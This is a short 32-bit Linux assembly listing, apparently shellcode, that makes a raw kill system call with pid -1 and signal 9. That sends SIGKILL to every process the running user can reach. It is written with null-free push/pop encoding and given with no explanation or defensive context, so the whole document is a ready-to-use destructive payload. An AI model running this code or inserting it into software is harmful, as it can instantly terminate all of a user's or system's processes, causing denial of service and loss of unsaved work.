global _start
_start:
    push byte 37
    pop eax
    push byte -1
    pop ebx
    push byte 9
    pop ecx
    int 0x80